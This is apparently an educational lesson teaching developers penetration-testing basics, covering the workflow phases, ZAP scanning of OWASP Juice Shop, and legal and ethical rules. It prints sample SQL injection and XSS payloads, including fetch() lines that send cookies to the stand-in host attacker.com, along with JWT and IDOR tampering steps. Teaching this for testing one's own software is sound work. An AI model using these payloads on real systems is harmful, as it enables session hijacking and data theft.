## Introduction

Penetration testing (pen testing) simulates real-world attacks to identify exploitable vulnerabilities before malicious actors do. While professional penetration testers are specialized experts, developers benefit from understanding pen testing fundamentals to build more secure applications and validate their security controls.

This lesson focuses on what developers need to know: basic pen testing concepts, tools, and techniques that help you think like an attacker and test your own applications safely.

## Key Concepts Summary

### What is Penetration Testing?

Penetration testing is authorized, simulated cyberattacks against your application to evaluate security. Pen testers:
- **Explore:** Map the application and identify attack surface
- **Attack:** Attempt to exploit vulnerabilities
- **Report:** Document findings with exploitation steps and business impact

Unlike SAST and DAST, pen testing combines automated scanning with manual techniques, creativity, and exploitation to confirm vulnerabilities are real and assess their impact.

### Why Penetration Testing Matters

**Validation:** Confirms that security controls actually work under attack conditions.

**Business Impact:** Demonstrates real-world impact of vulnerabilities to stakeholders.

**Comprehensive Coverage:** Combines multiple testing techniques and human creativity.

**Compliance:** Many regulations require periodic penetration testing (PCI-DSS, SOC 2, ISO 27001).

**Attacker Perspective:** Reveals how attackers chain multiple weaknesses into critical exploits.

### Types of Penetration Testing

**1. Black Box Testing**
- Tester has no internal knowledge
- Simulates external attacker
- Tests external defenses
- Example: Public-facing website assessment

**2. White Box Testing**
- Tester has full knowledge (code, architecture, credentials)
- Simulates insider threat or comprehensive audit
- Most thorough coverage
- Example: Complete application security audit

**3. Gray Box Testing**
- Tester has partial knowledge (user credentials, limited documentation)
- Simulates authenticated user or partner
- Balance between coverage and realism
- Example: Authenticated API testing

### Penetration Testing vs Other Testing

| Testing Type | Objective | Approach | Tools |
|--------------|-----------|----------|-------|
| **SAST** | Find code vulnerabilities | Analyze source code | SonarQube, Semgrep |
| **DAST** | Find runtime vulnerabilities | Scan running app | OWASP ZAP, Burp Suite |
| **Pen Testing** | Validate exploitability | Manual + automated attack simulation | ZAP, Burp, Metasploit, custom scripts |
| **Red Teaming** | Test entire security posture | Sophisticated, multi-vector attacks | All of the above + social engineering |

## Penetration Testing Workflow

### Phase 1: Reconnaissance (Explore)

**Goal:** Understand the target application and identify attack surface.

**Activities:**
- Map all pages, endpoints, and APIs
- Identify technologies, frameworks, and versions
- Discover hidden content (admin panels, backup files, config files)
- Enumerate users, roles, and permissions
- Identify third-party integrations

**Tools:**
- **Browser DevTools:** Inspect requests, responses, cookies, storage
- **OWASP ZAP Spider:** Automated content discovery
- **Burp Suite Crawler:** Map application structure
- **Wappalyzer:** Identify technologies
- **Directory Bruteforcing:** Find hidden paths

**Example: Technology Fingerprinting**
```bash
# Check HTTP headers
curl -I https://example.com

# Result reveals:
# Server: nginx/1.18.0
# X-Powered-By: PHP/7.4.3
# X-AspNet-Version: 4.0.30319
```

This information helps identify potential vulnerabilities in specific versions.

### Phase 2: Scanning and Enumeration

**Goal:** Identify potential vulnerabilities.

**Activities:**
- Run automated vulnerability scanners
- Test for common vulnerabilities (OWASP Top 10)
- Identify weak configurations
- Enumerate valid usernames
- Map authentication and authorization mechanisms

**Tools:**
- **OWASP ZAP Active Scan:** Automated vulnerability testing
- **Burp Scanner (Professional):** Comprehensive scanning
- **Nikto:** Web server scanner
- **Nmap:** Port and service scanning

**Example: User Enumeration**
```http
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username": "admin", "password": "wrong"}

Response 1 (user exists):
HTTP/1.1 401 Unauthorized
{"error": "Invalid password"}

Response 2 (user doesn't exist):
HTTP/1.1 404 Not Found
{"error": "User not found"}
```

Different responses reveal whether usernames exist—enabling targeted attacks.

### Phase 3: Exploitation

**Goal:** Confirm vulnerabilities are exploitable and assess impact.

**Activities:**
- Manually exploit identified vulnerabilities
- Chain multiple weaknesses
- Escalate privileges
- Access sensitive data
- Demonstrate business impact

**Common Exploits:**

**SQL Injection:**
```http
GET /products?id=1' UNION SELECT username, password FROM users-- HTTP/1.1

# If successful, extracts user credentials
```

**Cross-Site Scripting (XSS):**
```html
<!-- Reflected XSS -->
<input value="<script>alert(document.cookie)</script>">

<!-- Stored XSS -->
Comment: <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

**Authentication Bypass:**
```http
POST /api/admin/users HTTP/1.1
Authorization: Bearer expired_token

# If authorization isn't properly checked, gain admin access
```

**Insecure Direct Object Reference (IDOR):**
```http
GET /api/users/123/documents HTTP/1.1
# Change to: /api/users/124/documents
# Access another user's documents if authorization isn't checked
```

### Phase 4: Post-Exploitation

**Goal:** Determine the full extent of compromise.

**Activities:**
- Maintain access (in controlled environment)
- Pivot to other systems (if in scope)
- Exfiltrate data (in controlled manner)
- Assess overall impact
- Document exploitation chain

### Phase 5: Reporting

**Goal:** Communicate findings to stakeholders with actionable recommendations.

**Report Contents:**
- **Executive Summary:** High-level findings and business impact
- **Methodology:** Scope, approach, and limitations
- **Findings:** Detailed vulnerabilities with:
  - Severity rating
  - Description
  - Exploitation steps
  - Proof of concept
  - Business impact
  - Remediation recommendations
  - References (OWASP, CWE, CVE)
- **Conclusion:** Overall security posture assessment

## Essential Pen Testing Skills for Developers

### 1. Understanding HTTP

**Request Structure:**
```http
GET /api/users/123 HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Cookie: session=abc123; preferences=dark
User-Agent: Mozilla/5.0...
Accept: application/json
```

**Response Structure:**
```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=new_session; HttpOnly; Secure
Cache-Control: no-store

{"id": 123, "username": "alice", "role": "user"}
```

**Developer Insight:** Understanding HTTP helps you manipulate requests to test authorization, session handling, and input validation.

### 2. Browser Developer Tools

**Inspect Requests:**
- Network tab: See all requests/responses
- Application tab: View cookies, localStorage, sessionStorage
- Console: Test JavaScript and API calls
- Security tab: Check certificate and connection security

**Example: Testing Authorization**
```javascript
// In browser console, test API without proper authorization
fetch('/api/admin/users', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer invalid_token'
    }
}).then(r => r.json()).then(console.log);

// If it returns data, authorization is broken
```

### 3. SQL Injection Testing

**Basic Tests:**
```sql
-- Test 1: Syntax error (does app crash?)
' 

-- Test 2: Tautology (always true)
' OR '1'='1

-- Test 3: UNION attack (extract data)
' UNION SELECT username, password FROM users--

-- Test 4: Time-based blind SQLi (no error message)
' AND SLEEP(5)--
```

**Developer Insight:** If any of these change application behavior, SQL injection is likely present.

### 4. XSS Testing

**Reflected XSS:**
```html
<!-- Test in search parameter -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Stored XSS:**
```html
<!-- Test in comment form -->
<script>
    fetch('https://attacker.com?cookie=' + document.cookie);
</script>
```

**Developer Insight:** If payloads execute, output encoding is insufficient.

### 5. Authentication Testing

**Common Tests:**
```http
# Test 1: Weak password policy
Username: admin
Password: password

# Test 2: Username enumeration
Try different usernames, observe response differences

# Test 3: Session fixation
1. Obtain session ID before login
2. Login
3. Check if session ID changed (should change!)

# Test 4: JWT manipulation
Decode JWT, modify claims (e.g., role: "admin"), re-encode
If accepted, signature validation is broken
```

## Basic Penetration Test with OWASP ZAP

### Step-by-Step Walkthrough

**1. Set Up Target (OWASP Juice Shop):**
```bash
docker run -p 3000:3000 bkimminich/juice-shop
```

**2. Launch OWASP ZAP:**
```bash
# Docker
docker run -u zap -p 8080:8080 ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

# Or use installed application
```

**3. Configure Browser Proxy:**
- Set browser proxy to localhost:8080
- Import ZAP certificate for HTTPS

**4. Spider the Application:**
```python
# ZAP API
zap.spider.scan('http://localhost:3000')

# Wait for completion
while int(zap.spider.status()) < 100:
    time.sleep(2)
```

**5. Review Discovered Content:**
- Check Sites tree in ZAP
- Identify interesting endpoints
- Note forms, APIs, and parameters

**6. Active Scan:**
```python
# Run active scan
zap.ascan.scan('http://localhost:3000')

# Monitor progress
while int(zap.ascan.status()) < 100:
    time.sleep(5)
```

**7. Manual Testing:**
- Intercept requests with ZAP proxy
- Modify parameters to test for:
  - SQL injection
  - XSS
  - Authentication bypasses
  - Authorization issues
- Use Fuzzer to test multiple payloads

**8. Review and Exploit Findings:**
```
Example Finding: SQL Injection in /rest/products/search

Test:
GET /rest/products/search?q=apple' HTTP/1.1

Response: 500 Internal Server Error
"message": "SQLITE_ERROR: near \"apple'\": syntax error"

Exploit:
GET /rest/products/search?q=apple'))--

# Successfully bypasses query, returns all products
```

**9. Generate Report:**
```bash
# HTML report
zap-cli report -o juice-shop-pentest.html -f html

# Or use ZAP UI: Report > Generate HTML Report
```

## Ethical and Legal Considerations

### ⚠️ Critical Rules

**1. Get Written Authorization**
- Never test systems you don't own without explicit written permission
- Unauthorized testing is illegal (Computer Fraud and Abuse Act, CFAA)
- Even well-intentioned testing can result in criminal charges

**2. Stay in Scope**
- Test only systems explicitly authorized
- Respect boundaries (no social engineering, no physical access, etc.)
- Don't pivot to out-of-scope systems

**3. Limit Impact**
- Test in non-production environments when possible
- Avoid DoS attacks or actions that degrade service
- Don't exfiltrate real sensitive data

**4. Use Safe Practice Environments**
- OWASP Juice Shop, DVWA, WebGoat are designed for testing
- PortSwigger labs are legal and safe
- Never practice on real applications without permission

**5. Report Responsibly**
- Follow responsible disclosure practices
- Give organizations time to fix before public disclosure
- Report findings professionally and constructively

### Bug Bounty Programs

If you want to test real applications legally:
- **HackerOne:** https://www.hackerone.com/
- **Bugcrowd:** https://www.bugcrowd.com/
- **Synack:** https://www.synack.com/
- **Company Programs:** Many companies (Google, Microsoft, Facebook) run their own

**Rules:**
- Read the program scope carefully
- Follow disclosure timelines
- Test only in-scope assets
- Don't exploit beyond proof-of-concept

## Collaborating with Professional Penetration Testers

### Before the Test

**As a Developer:**
- Provide documentation (architecture, APIs, authentication flows)
- Identify critical business logic
- Set up test accounts with various privilege levels
- Clarify scope and boundaries
- Establish communication channels

### During the Test

**Expect:**
- Questions about functionality and edge cases
- Requests for additional test accounts
- Reports of suspicious activity (expected!)
- Real-time findings of critical issues

**Don't:**
- Block or ban tester IPs
- Reset passwords mid-test
- Make changes to the application
- Dismiss findings without investigation

### After the Test

**Review the Report:**
- Understand each finding
- Validate severity ratings
- Ask questions if unclear
- Prioritize remediation

**Remediate:**
- Fix critical issues first
- Verify fixes with re-testing
- Update security controls
- Document lessons learned

## Best Practices for Developers

### 1. Test Your Own Code
Before deployment, conduct basic penetration tests:
- Test authentication with weak credentials
- Try injecting SQL/XSS payloads
- Attempt to access other users' data
- Bypass client-side validation

### 2. Think Like an Attacker
When writing code, ask:
- What if input is malicious?
- Can users access data they shouldn't?
- What if tokens are tampered with?
- What's the worst that could happen?

### 3. Use Practice Environments
Regularly practice on OWASP Juice Shop, DVWA, or PortSwigger labs to sharpen skills.

### 4. Learn from Real Exploits
Study:
- OWASP Top 10
- Recent CVEs
- Bug bounty write-ups
- Security conference talks

### 5. Integrate Testing into SDLC
- Security requirements in design
- SAST in development
- DAST in testing
- Penetration testing before production
- Red team exercises annually
